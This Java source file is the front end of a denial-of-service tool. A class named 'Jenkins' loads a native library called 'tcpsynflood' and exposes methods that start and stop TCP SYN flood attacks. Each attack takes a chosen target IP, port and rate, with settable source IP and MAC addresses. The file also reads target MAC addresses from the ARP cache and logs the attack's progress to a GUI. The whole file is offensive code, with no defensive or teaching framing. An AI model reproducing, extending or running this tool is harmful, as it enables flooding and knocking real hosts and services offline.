package com.yourpackage;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import java.util.Enumeration;
import java.util.List;
import java.util.ArrayList;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.logging.Logger;

public class Jenkins {
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private volatile boolean stopAttack = false;
    private TextArea logArea;

    // Load the native library
    static {
        try {
            System.out.println("Attempting to load native library: tcpsynflood");
            System.out.println("Java library path: " + System.getProperty("java.library.path"));
            System.loadLibrary("tcpsynflood");
            System.out.println("Native library loaded: tcpsynflood");
        } catch (UnsatisfiedLinkError e) {
            System.err.println("Failed to load native library: " + e.getMessage());
        }
    }

    // Native methods for TCP SYN flood and stopping the attack
    public native int tcpSynFloodJNI(String targetIp, int targetPort, long bytesPerSecond, String sourceIp, String sourceMac, String networkCard);
    public native void nativeStopAttack();     

    // Method to initiate TCP SYN flood attack
    public void tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond, ChartUpdateCallback chartCallback, String sourceIp, String sourceMac, String networkCard) {
        log("Starting TCP SYN flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes per second");
        stopAttack = false;

        new Thread(() -> {
            try {
                log("Attempting to start TCP SYN flood with source IP: " + sourceIp + ", source MAC: " + sourceMac + ", and network card: " + networkCard);
                int result = tcpSynFloodJNI(targetIp, targetPort, bytesPerSecond, sourceIp, sourceMac, networkCard);
                log("Native TCP SYN flood returned: " + result);
                if (result == 0) {
                    log("TCP SYN flood attack completed successfully.");
                } else {
                    log("TCP SYN flood attack failed with error code: " + result);
                }
            } catch (UnsatisfiedLinkError e) {
                log("Native method not implemented or failed to link: " + e.getMessage());
                e.printStackTrace();
            } catch (Exception e) {
                log("Error in TCP SYN flood: " + e.getMessage());
                e.printStackTrace();
            }
            log("TCP SYN flood attack stopped");
        }).start();
    }

    // Method to stop the attack
    public void stopAttack() {
        stopAttack = true;
        try {
            nativeStopAttack();
            log("Stop attack flag set to true");
        } catch (UnsatisfiedLinkError e) {
            log("Failed to stop the attack: Native method not implemented - " + e.getMessage());
        }
    }

    // Method to get the MAC address of a target IP
    public String getMacAddress(String targetIp) {
        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            String mac = getDestinationMacAddress(targetAddress);
            if (mac == null) {
                log("MAC address could not be retrieved for IP: " + targetIp);
                return null;
            }
            log("MAC address retrieved: " + mac);
            return mac;
        } catch (Exception e) {
            log("Error retrieving MAC address: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    // Helper method to resolve MAC address from ARP table
    private String getDestinationMacAddress(InetAddress targetAddress) {
        try {
            String targetIp = targetAddress.getHostAddress();
            ProcessBuilder pb = new ProcessBuilder("arp", "-a", targetIp);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println("ARP output line: " + line);
                if (line.contains(targetIp)) {
                    String[] parts = line.split("\\s+");
                    for (String part : parts) {
                        if (part.matches("([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")) {
                            return part;
                        }
                    }
                }
            }
            log("MAC address not found in ARP cache for IP: " + targetIp);
            return null;
        } catch (Exception e) {
            log("Error in ARP resolution: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    // Method to get network devices
    public List<String> getNetworkDevices() {
        List<String> devices = new ArrayList<>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface = interfaces.nextElement();
                devices.add(networkInterface.getName());

            }
        } catch (Exception e) {
            log("Error retrieving network devices: " + e.getMessage());
        }
        return devices;
    }

    // Method to set the source IP
    public void setSourceIp(String sourceIp) {
        log("Source IP set to: " + sourceIp);
    }

    // Method to set the source MAC address
    public void setSourceMac(byte[] sourceMac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < sourceMac.length; i++) {
            sb.append(String.format("%02X%s", sourceMac[i], (i < sourceMac.length - 1) ? ":" : ""));
        }
        log("Source MAC set to: " + sb.toString());
    }

    // Method to set the TextArea for logging purposes
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // Method to log a message
    private void log(String message) {
        logger.info(message);
        if (logArea != null) {
            Platform.runLater(() -> {
                logArea.appendText(java.time.LocalDateTime.now().format(java.time.format.DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + " - " + message + "\n");
            });
        }
        System.out.println(message);
    }

    // ChartUpdateCallback Interface
    public interface ChartUpdateCallback {
        void update(double elapsedTimeSeconds, double actualMbps);
    }
}
